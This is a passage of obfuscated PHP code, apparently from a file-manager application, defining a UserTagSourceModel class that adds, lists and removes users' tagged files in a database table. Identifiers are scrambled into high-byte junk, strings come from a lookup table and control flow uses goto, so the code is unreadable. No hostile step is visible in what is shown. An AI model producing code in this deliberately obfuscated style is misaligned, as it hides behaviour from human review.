: array(); $²À“Ñıõ = array(); for ($¢ÛŒ“Â£ = 0; $¢ÛŒ“Â£ < count($„òÛ¢É§); $¢ÛŒ“Â£++) { $²À“Ñıõ[$õ¦õŒÜ[440] . $„òÛ¢É§[$¢ÛŒ“Â£][$õ¦õŒÜ[443]]] = $„òÛ¢É§[$¢ÛŒ“Â£]; } return Model($this->modelType)->set($²À“Ñıõ, !1, $this->optionType); } private function getAutoName($Çö³ë–) { $§×ıáÌ = array_to_keyvalue($this->listData(), $_SERVER[—ÌÒğš÷][32]); if (!$§×ıáÌ || !isset($§×ıáÌ[$Çö³ë–])) { return $Çö³ë–; } for ($ãÄó‘Ü = 1; $ãÄó‘Ü < count($§×ıáÌ); $ãÄó‘Ü++) { $ä»ñí¢Ù = $Çö³ë– . "\50{$ãÄó‘Ü}\51"; if (!isset($§×ıáÌ[$ä»ñí¢Ù])) { return $ä»ñí¢Ù; } } return $ä»ñí¢Ù; } } goto EÉ÷Öòïˆ‹; DÔó¶ã­¿ë: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($ëÕ‡ÑÃç) { $Êû°ŠÖÇ =& $_SERVER[—ÌÒğš÷]; return array($Êû°ŠÖÇ[1998] => array($Êû°ŠÖÇ[2387] . USER_ID, $Êû°ŠÖÇ[1999])); } protected function listData() { $Æ½É±¯ =& $_SERVER[—ÌÒğš÷]; $úÍÆü¬Á = array($Æ½É±¯[1679] => USER_ID, $Æ½É±¯[525] => array($Æ½É±¯[2002], 0)); $¥€¼üÈé = $Æ½É±¯[2388]; $ØÂÊ¹ğâ = $this->field($¥€¼üÈé)->where($úÍÆü¬Á)->order($Æ½É±¯[2005])->select(); return $ØÂÊ¹ğâ ? $ØÂÊ¹ğâ : array(); } protected function addToTag($ÇùÏªşŸ, $¾ˆˆŞ´¶) { $ÂëÂ‘ûÇ =& $_SERVER[—ÌÒğš÷]; if (!Model($ÂëÂ‘ûÇ[2147])->listData($¾ˆˆŞ´¶)) { return !1; } if (is_numeric($ÇùÏªşŸ)) { $øáÓˆ§ö = Model($ÂëÂ‘ûÇ[861])->pathInfo($ÇùÏªşŸ); if (!$øáÓˆ§ö) { return !1; } } else { $øáÓˆ§ö = IO::infoSimple($ÇùÏªşŸ); if (!$øáÓˆ§ö) { return !1; } $½‘Óüû± = $øáÓˆ§ö[$ÂëÂ‘ûÇ[32]]; $İºÏ„‘£ = $øáÓˆ§ö[$ÂëÂ‘ûÇ[33]]; if (isset($øáÓˆ§ö[$ÂëÂ‘ûÇ[453]])) { $İºÏ„‘£ = $øáÓˆ§ö[$ÂëÂ‘ûÇ[453]] == $ÂëÂ‘ûÇ[88] ? $ÂëÂ‘ûÇ[75] : $ÂëÂ‘ûÇ[214]; } } $ª·¾¢ = array($ÂëÂ‘ûÇ[1679] => USER_ID, $ÂëÂ‘ûÇ[525] => $¾ˆˆŞ´¶, $ÂëÂ‘ûÇ[463] => $ÇùÏªşŸ, $ÂëÂ‘ûÇ[464] => $İºÏ„‘£ ? $İºÏ„‘£ : $ÂëÂ‘ûÇ[458], $ÂëÂ‘ûÇ[462] => $½‘Óüû± ? $½‘Óüû± : $ÂëÂ‘ûÇ[12], $ÂëÂ‘ûÇ[1891] => 0); if ($this->where($ª·¾¢)->find()) { return !1; } return $this->add($ª·¾¢); } protected function removeFromTag($ÃÂõ·¼, $ÀŞáô„) { $ØİÒÇÄğ =& $_SERVER[—ÌÒğš÷]; if (!Model($ØİÒÇÄğ[2147])->listData($ÀŞáô„)) { return !1; } if (is_array($ÃÂõ·¼)) { $ÃÂõ·¼ = array($ØİÒÇÄğ[7], $ÃÂõ·¼); } $Ùºìò—² = array($ØİÒÇÄğ[1679] => USER_ID, $ØİÒÇÄğ[525] => $ÀŞáô„, $ØİÒÇÄğ[463] => $ÃÂõ·¼); return $this->where($Ùºìò—²)->delete(); } protected function removeByTag($ˆ§¶‰—·) { $•ŞÉ¾Äš =& $_SERVER[—ÌÒğš÷]; if (!$ˆ§¶‰—·) { return !1; } $ì²Í‘²ë = array($•ŞÉ¾Äš[1679] => USER_ID, $•ŞÉ¾Äš[525] => $ˆ§¶‰—·); return $this->where($ì²Í‘²ë)->delete(); } protected function removeBySource($¡•™ÑëÛ) { $¬öª¾¤Œ =& $_SERVER[—ÌÒğš÷]; if (is_array($¡•™ÑëÛ)) { $¡•™ÑëÛ = array($¬öª¾¤Œ[7], $¡•™ÑëÛ); } $§€œ ¦ = array($¬öª¾¤Œ[1679] => USER_ID, $¬öª¾¤Œ[525] => array($¬öª¾¤Œ[1058], 0), $¬öª¾¤Œ[463] => $¡•™ÑëÛ); return $this->where($§€œ ¦)->delete(); } }